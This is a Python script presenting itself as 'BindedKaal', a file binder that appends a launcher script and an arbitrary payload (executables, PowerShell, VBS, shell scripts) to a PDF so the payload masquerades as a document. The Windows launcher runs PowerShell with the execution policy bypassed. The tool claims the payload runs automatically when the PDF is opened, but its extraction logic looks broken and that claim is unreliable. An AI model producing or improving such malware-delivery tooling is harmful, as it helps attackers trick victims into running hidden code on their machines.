#!/usr/bin/env python3

import os
import sys
import shutil
import tempfile
import platform
import subprocess
from datetime import datetime


RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"
BOLD = "\033[1m"

def clear_screen():
    """Clear the terminal screen based on OS"""
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def display_banner():
    """Display the BindedKaal ASCII art banner"""
    banner = f"""{RED}
 ██████╗ ██╗███╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  █████╗ ██╗     
 ██╔══██╗██║████╗  ██║██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗██║     
 ██████╔╝██║██╔██╗ ██║██║  ██║█████╗  ██║  ██║█████╔╝ ███████║███████║██║     
 ██╔══██╗██║██║╚██╗██║██║  ██║██╔══╝  ██║  ██║██╔═██╗ ██╔══██║██╔══██║██║     
 ██████╔╝██║██║ ╚████║██████╔╝███████╗██████╔╝██║  ██╗██║  ██║██║  ██║███████╗
 ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                                                 
{RESET}{BOLD}[File Binder Tool - v1.0]{RESET}
"""
    print(banner)

def display_menu():
    print(f"\n{BOLD}Choose an option:{RESET}")
    print(f"{BLUE}1.{RESET} Select PDF file")
    print(f"{BLUE}2.{RESET} Select payload file")
    print(f"{BLUE}3.{RESET} Bind files")
    print(f"{BLUE}4.{RESET} Exit")
    print(f"\n{YELLOW}BindedKaal{RESET} > ", end="")

def select_file(file_type):
    while True:
        file_path = input(f"\nEnter path to {file_type} file: ")
        file_path = file_path.strip('"\'')  # Remove quotes if present
        
        if not file_path:
            print(f"{YELLOW}[!] No file selected{RESET}")
            return None
            
        if not os.path.exists(file_path):
            print(f"{RED}[!] File not found{RESET}")
            continue
            
        if not os.path.isfile(file_path):
            print(f"{RED}[!] Not a valid file{RESET}")
            continue
            
        print(f"{GREEN}[+] Selected {file_type}: {file_path}{RESET}")
        return file_path

def bind_files(pdf_path, payload_path):
    if not pdf_path or not payload_path:
        print(f"{RED}[!] Both PDF and payload must be selected{RESET}")
        return
    
    pdf_name = os.path.basename(pdf_path)
    payload_name = os.path.basename(payload_path)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_name = f"binded_{timestamp}.pdf"
    
    try:
        with open(pdf_path, 'rb') as pdf_file:
            pdf_data = pdf_file.read()
            
        with open(payload_path, 'rb') as payload_file:
            payload_data = payload_file.read()
        
        marker = b"%%BINDEDKAAL_PAYLOAD_MARKER%%"
        
        extension = os.path.splitext(payload_path)[1].lower()
        
        launcher_script = create_launcher_script(payload_name, extension)
        
        with open(output_name, 'wb') as output_file:
            output_file.write(pdf_data)
            output_file.write(marker)
            output_file.write(launcher_script.encode())
            output_file.write(marker)
            output_file.write(payload_data)
        
        add_execution_instructions(output_name, extension)
        
        print(f"\n{GREEN}[+] Successfully created:{RESET} {output_name}")
        print(f"{GREEN}[+] Size:{RESET} {os.path.getsize(output_name) / 1024:.2f} KB")
        
        return output_name
    
    except Exception as e:
        print(f"{RED}[!] Error binding files: {str(e)}{RESET}")
        return None

def create_launcher_script(payload_name, extension):

    temp_dir = "%TEMP%" if platform.system() == "Windows" else "/tmp"
    
    if platform.system() == "Windows":
        
        launcher = f"""@echo off
set payload_file={temp_dir}\\{payload_name}
if exist "%payload_file%" del /f /q "%payload_file%"
findstr /v /r ".*" {temp_dir}\\bk_temp.pdf > "%payload_file%"
"""
        
        if extension in ['.exe', '.bat', '.cmd', '.com']:
            launcher += 'start "" "%payload_file%"\r\n'
        elif extension == '.vbs':
            launcher += 'wscript "%payload_file%"\r\n'
        elif extension == '.ps1':
            launcher += 'powershell -ExecutionPolicy Bypass -File "%payload_file%"\r\n'
        elif extension == '.py':
            launcher += 'python "%payload_file%"\r\n'
        else:
            launcher += 'start "" "%payload_file%"\r\n'
        
        launcher += 'exit\r\n'
    else:
        launcher = f"""#!/bin/bash
payload_file={temp_dir}/{payload_name}
[ -f "$payload_file" ] && rm -f "$payload_file"
tail -n +$(grep -an "%%BINDEDKAAL_PAYLOAD_MARKER%%" $0 | tail -1 | cut -d: -f1) "$0" > "$payload_file"
"""
        if extension in ['.sh', '.bash']:
            launcher += 'chmod +x "$payload_file" && "$payload_file"\n'
        elif extension == '.py':
            launcher += 'python3 "$payload_file"\n'
        elif extension == '.pl':
            launcher += 'perl "$payload_file"\n'
        else:
            launcher += 'chmod +x "$payload_file" && "$payload_file"\n'
        
        launcher += 'exit 0\n'
    
    return launcher

def add_execution_instructions(output_file, extension):
    
    try:
        with open(output_file, 'ab') as f:
            comment = f"\n%PDF-Comment: Open this file with a PDF reader to view. The payload will execute automatically."
            f.write(comment.encode())
    except Exception as e:
        print(f"{YELLOW}[!] Could not add execution instructions: {str(e)}{RESET}")

def main():
    pdf_path = None
    payload_path = None
    
    while True:
        clear_screen()
        display_banner()
        
        if pdf_path:
            print(f"{GREEN}[+] PDF:{RESET} {pdf_path}")
        else:
            print(f"{YELLOW}[!] PDF:{RESET} Not selected")
            
        if payload_path:
            print(f"{GREEN}[+] Payload:{RESET} {payload_path}")
        else:
            print(f"{YELLOW}[!] Payload:{RESET} Not selected")
        
        display_menu()
        
        choice = input().strip()
        
        if choice == '1':
            pdf_path = select_file("PDF")
        
        elif choice == '2':
            payload_path = select_file("payload")
        
        elif choice == '3':
            if not pdf_path or not payload_path:
                print(f"\n{RED}[!] You must select both a PDF and a payload file first{RESET}")
                input(f"\n{BLUE}Press Enter to continue...{RESET}")
                continue
            
            output_file = bind_files(pdf_path, payload_path)
            if output_file:
                print(f"\n{GREEN}[+] Files bound successfully to:{RESET} {output_file}")
            
            input(f"\n{BLUE}Press Enter to continue...{RESET}")
        
        elif choice == '4':
            print(f"\n{GREEN}Goodbye!{RESET}")
            sys.exit(0)
        
        else:
            print(f"\n{RED}[!] Invalid choice{RESET}")
            input(f"\n{BLUE}Press Enter to continue...{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[!] Operation cancelled by user{RESET}")
        sys.exit(0)
